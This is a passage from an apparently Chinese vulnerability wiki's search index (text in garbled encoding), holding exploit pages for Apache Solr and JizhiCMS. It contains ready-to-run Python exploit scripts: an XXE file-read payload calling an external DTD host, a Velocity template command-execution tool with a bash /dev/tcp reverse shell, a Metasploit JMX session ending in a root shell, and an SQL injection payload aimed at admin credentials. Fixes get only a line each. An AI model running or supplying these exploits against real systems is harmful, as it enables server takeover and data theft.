>>> dnslogåœ°å€(æ¼æ´å¤–è¿æ£€æµ‹) \\033[0m') print('+ \\033[36mCmd >>> xxe_file(è¯»å–/etc/passwd) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url): dns_payload = \"\"\" /solr/%s/select?q={!xmlparser v=''}&wt=xml \"\"\" % (core_name, dnslog_url) vuln_url = target_url + dnslog_url headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"HTTP ERROR 500\" in response.text: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") else: print(\"\\033[32m[o] è¯·æŸ¥çœ‹dnslogå“åº” \\033[0m\") except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") def POC_3(target_url, core_name): file_payload = \"\"\"/solr/{}/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser\"\"\".format(core_name) vuln_url = target_url + file_payload headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"/usr/sbin\" in response.text: print(\"\\033[32m[o] æ¼æ´æˆåŠŸåˆ©ç”¨,å“åº”ä¸º\\n \\033[0m\",response.text) else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35mè¯·è¾“å…¥ä½ çš„dnslogåœ°å€ï¼š\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) elif cmd == \"xxe_file\": POC_3(target_url, core_name) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-04 22:23:21 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409.html","title":"Apache Solr JMXæœåŠ¡ RCE  CVE-2019-12409","keywords":"","body":"Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409 æ¼æ´æè¿° Java ManagementExtensionsï¼ˆJMXï¼‰æ˜¯ä¸€ç§JavaæŠ€æœ¯ï¼Œä¸ºç®¡ç†å’Œç›‘è§†åº”ç”¨ç¨‹åºã€ç³»ç»Ÿå¯¹è±¡ã€è®¾å¤‡ï¼ˆå¦‚æ‰“å°æœºï¼‰å’Œé¢å‘æœåŠ¡çš„ç½‘ç»œæä¾›ç›¸åº”çš„å·¥å…·ã€‚JMX ä½œä¸º Javaçš„ä¸€ç§Beanç®¡ç†æœºåˆ¶ï¼Œå¦‚æœJMXæœåŠ¡ç«¯å£æš´éœ²ï¼Œé‚£ä¹ˆè¿œç¨‹æ”»å‡»è€…å¯ä»¥è®©è¯¥æœåŠ¡å™¨è¿œç¨‹åŠ è½½æ¶æ„çš„Beanæ–‡ä»¶ï¼Œéšç€Beançš„æ»¥ç”¨å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr 8.1.1 Apache Solr 8.2.0 ç¯å¢ƒæ­å»º ä¸‹è½½ Apache Solr 8.2.0 ä¹Ÿå¯ä»¥dockeræ­å»º docker pull solr:8.2.0 docker run --name solr -d -p 8983:8983 -t solr:8.2.0 è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° æŸ¥çœ‹æ­å»ºçš„Solræ˜¯å¦å­˜åœ¨æ¼æ´,æŸ¥çœ‹solr.in.shé…ç½®æ–‡ä»¶ä¸­çš„ENABLE_REMOTE_JMX_OPTSé€‰é¡¹è®¾ç½®æ˜¯å¦ä¸ºâ€œTureâ€ï¼Œå¦‚æœä¸ºTureï¼Œåˆ™å­˜åœ¨æ¼æ´ æŸ¥çœ‹æ¼æ´ç«¯å£18983æ˜¯å¦å¼€æ”¾ [!NOTE] nmap xxx.xxx.xxx.xxx -p 18983 root@kali:~/æ¡Œé¢# msfconsole , , / \\ ((__---,,,---__)) (_) O O (_)_________ \\ _ / |\\ o_o \\ M S F | \\ \\ _____ | * ||| WW||| ||| ||| =[ metasploit v5.0.101-dev ] + -- --=[ 2049 exploits - 1108 auxiliary - 344 post ] + -- --=[ 562 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] Metasploit tip: Writing a custom module? After editing your module, why not try the reload command msf5 > use exploit/multi/misc/java_jmx_server [*] No payload configured, defaulting to java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > set rhost 192.168.51.146 rhost => 192.168.51.146 msf5 exploit(multi/misc/java_jmx_server) > set rport 18983 rport => 18983 msf5 exploit(multi/misc/java_jmx_server) > set payload java/meterpreter/reverse_tcp payload => java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > options Module options (exploit/multi/misc/java_jmx_server): Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX_PASSWORD no The password to interact with an authenticated JMX endpoint JMX_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS 192.168.51.146 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 18983 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.51.149 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Generic (Java Payload) msf5 exploit(multi/misc/java_jmx_server) > run [*] Started reverse TCP handler on 192.168.51.149:4444 [*] 192.168.51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Sending RMI Header... [*] 192.168.51.146:18983 - Discovering the JMXRMI endpoint... [+] 192.168.51.146:18983 - JMXRMI endpoint on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Proceeding with handshake... [+] 192.168.51.146:18983 - Handshake with JMX MBean server on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Loading payload... [*] 192.168.51.146:18983 - Replied to request for mlet [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] 192.168.51.146:18983 - Executing payload... [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] Sending stage (53944 bytes) to 192.168.51.146 [*] Meterpreter session 1 opened (192.168.51.149:4444 -> 192.168.51.146:56234) at 2020-11-05 14:17:04 +0800 meterpreter > meterpreter > shell Process 1 created. Channel 1 created. id ç”¨æˆ·id=0(root) ç»„id=0(root) ç»„=0(root) æ¼æ´ä¿®å¤ å°†solr.in.shé…ç½®æ–‡ä»¶ä¸­çš„ENABLE_REMOTE_JMX_OPTSé€‰é¡¹è®¾ç½®ä¸ºfalseï¼Œç„¶åé‡å¯SolræœåŠ¡ã€‚ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-05 16:34:35 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957.html","title":"Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957","keywords":"","body":"Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957 æ¼æ´æè¿° åœ¨ç‰¹å®šçš„Solrç‰ˆæœ¬ä¸­ConfigSet APIå­˜åœ¨æœªæˆæƒä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…åˆ©ç”¨æ¼æ´å¯å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr 6.6.0 -6.6.5 Apache Solr 7.0.0 -7.7.3 Apache Solr 8.0.0 -8.6.2 ç¯å¢ƒæ­å»º é€‰æ‹©ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬ ä¸‹è½½å„ç‰ˆæœ¬Solråœ°å€ è¿™é‡Œå¤ç°ä½¿ç”¨çš„æ˜¯ Apache Solr 7.7.0 è¿›è¡Œå¤ç° ä¸‹è½½åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œç¯å¢ƒéƒ¨ç½² cd solr-7.7.0 ./bin/solr start -e cloud -force ç„¶åä¸€è·¯å›è½¦ï¼Œç›´è‡³å‡ºç° Created collection 'gettingstarted' with 2 shard(s), 2 replica(s) with config-set 'gettingstarted' Enabling auto soft-commits with maxTime 3 secs using the Config API POSTing request to Config API: http://localhost:8983/solr/gettingstarted/config {\"set-property\":{\"updateHandler.autoSoftCommit.maxTime\":\"3000\"}} Successfully set-property updateHandler.autoSoftCommit.maxTime to 3000 SolrCloud example running, please visit: http://localhost:8983/solr è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° åœ¨æ”»å‡»æœºä¸Šä¸‹è½½ç›®æ ‡ç‰ˆæœ¬çš„Solr,æ‰§è¡Œä¸‹åˆ—å‘½ä»¤æ‰“åŒ…å‹ç¼©æ–‡ä»¶ solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf zip -r - * > vuln.zip å°† vuln.zip è¿›è¡Œä¸Šä¼  curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @vuln.zip \"http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD&name=vuln\" [!NOTE] nameå‚æ•°ä¸ºå‹ç¼©åŒ…çš„æ–‡ä»¶å åˆ©ç”¨æ¼æ´åˆ›å»ºä¸€ä¸ª core curl \"http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE&name=peiqi&numShards=1&replicationFactor=1&wt=xml&collection.configName=vuln\" [!NOTE] nameå‚æ•°ä¸ºåˆ›å»ºçš„coreæ ¸å¿ƒå collection.configNameå‚æ•°ä¸ºä¸Šä¼ çš„æ–‡ä»¶å æŸ¥çœ‹coreåˆ—è¡¨ï¼Œå‘ç°å·²ç»æˆåŠŸåˆ›å»º å†ä½¿ç”¨ Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤ POCä½¿ç”¨è¯¦æƒ…å‚è€ƒå¦ä¸€ç¯‡å¤ç°æ–‡ç«  æ¼æ´åˆ©ç”¨POC [!NOTE] ä½¿ç”¨å‰æŒ‰å¤ç°æ­¥éª¤ä¸Šä¼ å¯¹åº”ç‰ˆæœ¬çš„zipæ–‡ä»¶ï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶ä¸º qwert.zip,å…¶ä»–ä½¿ç”¨æ–¹æ³•ä¸ Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 çš„POCä½¿ç”¨æ–¹æ³•ç±»ä¼¼ #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys import os import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr 6.6.0 -6.6.5 \\033[0m') print('+ \\033[34m Apache Solr 7.0.0 -7.7.3 \\033[0m') print('+ \\033[34m Apache Solr 8.0.0 -8.6.2 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 cve-2020-13957.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mZip >>> vuln.zip(Zipæ–‡ä»¶å) \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): core_name = str(input(\"\\033[35mPlease input Create Core Name\\nCore >>> \\033[0m\")) core_update = \"\"\"%s/solr/admin/collections?action=CREATE&name=%s&numShards=1&replicationFactor=1&wt=xml&collection.configName=%s\"\"\" % (target_url, core_name, file_name.replace(\".zip\",\"\")) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } response = requests.get(url=core_update, headers=headers, timeout=30) if response.status_code != 200: print(\"\\033[31m[x] åˆ›å»ºCoreå¤±è´¥ \\033[0m\") sys.exit(0) else: core = re.findall(r'(.*?)',response.text)[0] vuln_url = target_url + \"/solr/\" + core + \"/config\" print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core + \"/config\\033[0m\") return vuln_url,core def POC_2(target_url, core): open_params = target_url + \"/solr/\" + core + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POSTè¯·æ±‚æˆåŠŸå°†params.resource.loader.enabledè®¾ç½®ä¸ºTrue \\033[0m\") else: print(\"\\033[31m[x] POSTè¯·æ±‚params.resource.loader.enabledè®¾ç½®ä¸ºTrueå¤±è´¥ \\033[0m\") sys.exit(0) def POC_3(target_url, core, cmd): vuln_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] ä»£ç æ‰§è¡Œå¤±è´¥ï¼Œå“åº”ä¸º Error 500 \\033[0m\") else: print(\"\\033[32m[o] æ¼æ´æˆåŠŸåˆ©ç”¨,å“åº”ä¸º\\n \\033[0m\",response.text) def POC_4(target_url, core, IP, PORT): # POC : /bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, PORT) vnul_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = str(input(\"\\033[35mPlease input File Name\\nZip >>> \\033[0m\")) vuln_url,core = POC_1(target_url, file_name) POC_2(target_url, core) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_4(target_url, core, IP, PORT) else: POC_3(target_url, core, cmd) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-05 22:53:28 "},"PeiQi_Wiki/cms_wiki/":{"url":"PeiQi_Wiki/cms_wiki/","title":"CMSæ¼æ´","keywords":"","body":"CMS æ¼æ´æ•´ç†ğŸ‘» æè‡´CMS æè‡´CMS å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶ä¸Šä¼ (åå°æƒé™) æè‡´CMS å­˜å‚¨å‹XSS æè‡´CMS æè‡´cms 1.71,1.7,1.67 ç‰ˆæœ¬ æ”¯ä»˜æ’ä»¶SQLæ³¨å…¥ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-01 00:47:44 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/","title":"æè‡´CMS","keywords":"","body":"æè‡´CMS æè‡´CMS å…¨ç‰ˆæœ¬ä»»æ„ä»£ç æ‰§è¡Œ(åå°æƒé™) æè‡´CMS 1.71 ,1.7 ,1.67 ç‰ˆæœ¬ æ”¯ä»˜æ’ä»¶sqlæ³¨å…¥ æè‡´CMS PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-01 12:24:37 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶ä¸Šä¼ .html","title":"æè‡´CMS ä»»æ„æ–‡ä»¶ä¸Šä¼ (åå°æƒé™)","keywords":"","body":"æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶(åå°) ç™»é™†åå°æŸ¥çœ‹æ’ä»¶å¤„ï¼Œæœ‰ä¸€ä¸ªåå°ç¼–è¾‘çš„æ’ä»¶ å®‰è£…ä¹‹åè®¾ç½®å¯†ç å¹¶ä½¿ç”¨ [!NOTE] å¦‚æœå·²ç»è®¾æœ‰å¯†ç ï¼Œé‡æ–°å®‰è£…æ’ä»¶å³å¯è§£å†³å¯†ç æœªçŸ¥é—®é¢˜ ä¿®æ”¹ä¸ºphpä»£ç  æˆåŠŸæ‰§è¡Œphpä»£ç çš„å‘½ä»¤ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-03 14:35:16 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥.html":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥.html","title":"æè‡´CMS 1.71 + 1.7 + 1.67 ç‰ˆæœ¬sqlæ³¨å…¥","keywords":"","body":"æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥(æ”¯ä»˜æ’ä»¶) æŸ¥çœ‹ä¸€ä¸‹è¿›è¡Œè¿‡æ»¤çš„å‡½æ•° /** å‚æ•°è¿‡æ»¤ï¼Œæ ¼å¼åŒ– **/ function format_param($value=null,$int=0){ if($value==null){ return '';} switch ($int){ case 0://æ•´æ•° return (int)$value; case 1://å­—ç¬¦ä¸² $value=htmlspecialchars(trim($value), ENT_QUOTES); if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return $value; case 2://æ•°ç»„ if($value=='')return ''; array_walk_recursive($value, \"array_format\"); return $value; case 3://æµ®ç‚¹ return (float)$value; case 4: if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return trim($value); } } //è¿‡æ»¤XSSæ”»å‡» function SafeFilter(&$arr) { $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) { foreach ($arr as $key => $value) { if (!is_array($value)) { if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if (!get_magic_quotes_gpc()){ $value = addslashes($value); } } $value = preg_replace($ra,'',$value); //åˆ é™¤éæ‰“å°å­—ç¬¦ï¼Œç²—æš´å¼è¿‡æ»¤xsså¯ç–‘å­—ç¬¦ä¸² $arr[$key] = htmlentities(strip_tags($value)); //å»é™¤ HTML å’Œ PHP æ ‡è®°å¹¶è½¬æ¢ä¸º HTML å®ä½“ } else { SafeFilter($arr[$key]); } } } } çœ‹ä¸€ä¸‹æ‰§è¡Œçš„SQLè¯­å¥çš„å‡½æ•° // æŸ¥è¯¢ä¸€æ¡ public function find($where=null,$order=null,$fields=null,$limit=1) { if( $record = $this->findAll($where, $order, $fields, 1) ){ return array_pop($record); }else{ return FALSE; } } è·Ÿè¿› findAll å‡½æ•° // æŸ¥è¯¢æ‰€æœ‰ public function findAll($conditions=null,$order=null,$fields=null,$limit=null) { $where = ''; if(is_array($conditions)){ $join = array(); foreach( $conditions as $key => $value ){ $value = '\\''.$value.'\\''; $join[] = \"{$key} = {$value}\"; } $where = \"WHERE \".join(\" AND \",$join); }else{ if(null != $conditions)$where = \"WHERE \".$conditions; } if(is_array($order)){ $where .= ' ORDER BY '; $where .= implode(',', $order); }else{ if($order!=null)$where .= \" ORDER BY \".$order; } if(!empty($limit))$where .= \" LIMIT {$limit}\"; $fields = empty($fields) ? \"*\" : $fields; $sql = \"SELECT {$fields} FROM {$this->table} {$where}\"; return $this->getData($sql); } åœ¨è·Ÿè¿›ä¸€ä¸‹getDataå‡½æ•° //è·å–æ•°æ® public function getData($sql) { if(!$result = $this->query($sql))return array(); if(!$this->Statement->rowCount())return array(); $rows = array(); while($rows[] = $this->Statement->fetch(PDO::FETCH_ASSOC)){} $this->Statement=null; array_pop($rows); return $rows; } è·Ÿè¿›queryæ‰§è¡Œå‡½æ•° //æ‰§è¡ŒSQLè¯­å¥å¹¶æ£€æŸ¥æ˜¯å¦é”™è¯¯ public function query($sql){ $this->filter[] = $sql; $this->Statement = $this->pdo->query($sql); if ($this->Statement) { return $this; }else{ $msg = $this->pdo->errorInfo(); if($msg[2]) exit('æ•°æ®åº“é”™è¯¯ï¼š' . $msg[2] . end($this->filter)); } } çœ‹åˆ°$msg = $this->pdo->errorInfo();è¯­å¥ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šæŠŠæ•°æ®åº“æŠ¥é”™ä¿¡æ¯æ‰“å°åœ¨é¡µé¢ä¸Šå¹¶æ˜¾ç¤ºå‡ºæ¥å¹¶é€€å‡º ä¸€å¥—åˆ†æä¸‹æ¥æ²¡æœ‰å‘ç°å¯¹sqlè¯­å¥çš„è¿‡æ»¤ï¼Œå¦‚æœå¾—åˆ°çš„æ•°æ®æ²¡æœ‰ç»è¿‡format_paramè¿‡æ»¤ï¼Œä¼šäº§ç”Ÿæ³¨å…¥ ä¾‹å¦‚: function exploit(){ M('member')->find(['username'=>$_GET['name']]); } å¦‚æœç›´æ¥è¿™æ ·GET POST REQUEST å¸¦å…¥æ•°æ®åº“ ä¼šäº§ç”ŸæŠ¥é”™æ³¨å…¥ ä¾‹å¦‚ ./exploit/name=123' (åŠ ä¸€ä¸ªå¼•å·ä¼šæŠ¥é”™ï¼Œå¦‚æœå¼•å·æ²¡è¿‡æ»¤) ç°åœ¨åªéœ€è¦å¯»æ‰¾ç±»å‹æ˜¯è¿™æ ·æ²¡è¿‡æ»¤ç›´æ¥å¸¦å…¥æ•°æ®åº“çš„è¯­å¥å°±è¡Œäº† ç®€å•å¯»æ‰¾ä¸‹å…¶å®è¿™æ ·çš„åœ°æ–¹æŒºå¤šçš„ï¼Œæ‹¿ä¸€ä¸ªä½ç½®ä¸¾ä¾‹å­ è¿™é‡Œæ˜¯ä¸€ä¸ªæ”¯ä»˜æ’ä»¶çš„ä½ç½®ï¼Œè“è‰²æ–¹å—1å¢åŠ ä»£ç æ¨¡æ‹Ÿå¼€é€šæ”¯ä»˜å®åŠŸèƒ½é€šè¿‡éªŒè¯ å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°åªä½¿ç”¨[htmlspecialchars]æ¥è¿‡æ»¤äº†xssï¼Œsqlè¯­å¥æ²¡æœ‰è¿‡æ»¤ï¼Œç”¨åˆšåˆšçš„æ–¹æ³•æ¥æ³¨å…¥ å¯ä»¥çœ‹åˆ°çš„ç¡®å‡ºç°äº†sqlè¯­å¥å’Œæ•°æ®åº“é”™è¯¯ ç›´æ¥æŠ¥é”™æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+\" import requests import re \"\"\" å®˜ç½‘url : https://www.jizhicms.cn/ \"\"\" def main(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: æè‡´CMS 1.67 - 171 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CNVD-2020-49710.py \\033[0m') print('+------------------------------------------') while True: poc = str(input('é€‰æ‹©ä½¿ç”¨çš„pocï¼š\\n' '1.sqlæ³¨å…¥\\n' '2.ç”¨æˆ·è´­ç‰©è½¦çˆ†ç ´\\n' '3.GET ç½‘ç«™ç®¡ç†å‘˜è´¦å·å¯†ç \\n' '4.é€€å‡º quit\\n' 'poc:')) print('------------------ peiqi -----------------------') if poc == '1': poc_1() elif poc == '2': poc_2() elif poc == '3': poc_3() elif poc == '4': break else: print('å‚æ•°é”™è¯¯ï¼Œé‡æ–°è¾“å…¥') def poc_1(): ## poc_1 ---> sqlæ³¨å…¥æ¼æ´ç‚¹( Home/c/MypayController.php [alipay_notify_pay]) ## ä½¿ç”¨èŒƒå›´ æè‡´cms 1.71 + 1.7 + 1.67 ç‰ˆæœ¬ \"\"\" function alipay_return_pay(){ extendFile('pay/alipay/AlipayServiceCheck.php'); //æ”¯ä»˜å®å…¬é’¥ï¼Œè´¦æˆ·ä¸­å¿ƒ->å¯†é’¥ç®¡ç†->å¼€æ”¾å¹³å°å¯†é’¥ï¼Œæ‰¾åˆ°æ·»åŠ äº†æ”¯ä»˜åŠŸèƒ½çš„åº”ç”¨ï¼Œæ ¹æ®ä½ çš„åŠ å¯†ç±»å‹ï¼ŒæŸ¥çœ‹æ”¯ä»˜å®å…¬é’¥ $alipayPublicKey=$this->webconf['alipay_public_key']; $aliPay = new \\AlipayServiceCheck($alipayPublicKey); //éªŒè¯ç­¾å $result = $aliPay->rsaCheck($_GET,$_GET['sign_type']); $result=true; ä»˜æ¬¾æˆåŠŸ'; $out_trade_no = 